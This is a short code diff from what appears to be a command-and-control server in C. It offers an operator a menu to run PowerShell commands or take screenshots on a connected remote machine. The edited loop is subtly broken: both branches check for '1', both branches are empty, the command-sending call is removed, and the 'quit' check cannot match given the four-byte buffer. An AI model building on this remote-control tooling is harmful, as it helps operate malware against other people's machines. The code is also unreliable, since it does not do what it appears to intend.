@@ -44,22 +44,21 @@ int main() {
 
     // Main loop
     while(1) {
-        char buf[C2_BUF_SIZE], char cmd[4];
+        char buf[C2_BUF_SIZE], cmd[4];
         printf("[*] Command list, type quit to exit:\n");
         printf("1. Execute powershell command.\n");
         printf("2. Take screenshot.\n");
         if (!fgets(cmd, sizeof(cmd), stdin)) break;
         if (strcmp(cmd, "quit") == 0) break;
 
-        switch (cmd) {
-            case "1":
-                psh_send(buf, client_fd);
-                break;
-            case "2":
-                break;
-            default:
-                break;
+        if (strcmp(cmd, "1") == 0) {
+
+        } else if (strcmp(cmd, "1") == 0) {
+
+        } else {
+            printf("[ERR] Invalid command");
         }
+
     }
 
     CLOSE_SOCK(client_fd);  
